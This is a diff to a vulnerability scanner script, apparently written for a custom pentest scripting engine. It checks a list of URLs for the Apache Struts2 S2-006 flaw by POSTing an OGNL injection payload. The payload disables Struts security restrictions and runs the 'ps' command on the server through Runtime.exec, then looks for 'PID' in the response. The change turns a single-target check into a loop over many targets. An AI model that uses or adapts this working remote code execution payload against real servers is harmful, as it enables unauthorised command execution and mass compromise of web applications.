@@ -1,13 +1,23 @@
-#request url = var
+#request urls = array
 #define payload = ('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context['xwork.MethodAccessor.denyMethodExecution']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#mycmd='ps'')(d))&(h)(('#myret=@java.lang.Runtime@getRuntime().exec(#mycmd)')(d))&(i)(('#mydat=new java.io.DataInputStream(#myret.getInputStream())')(d))&(j)(('#myres=new byte[51020]')(d))&(k)(('#mydat.readFully(#myres)')(d))&(l)(('#mystr=new java.lang.String(#myres)')(d))&(m)(('#myout=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('#myout.getWriter().println(#mystr)')(d))
 #define bug =  PID
 #define info = 存在S2-006漏洞
 
 function main(args)
 {
-	res = HttpPost(url,payload,"Content-Type: application/x-www-form-urlencoded".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[0],bug,0)!= "-1")
-	{
-		print(url.info);
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpPost(url,payload,"Content-Type: application/x-www-form-urlencoded".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
 }
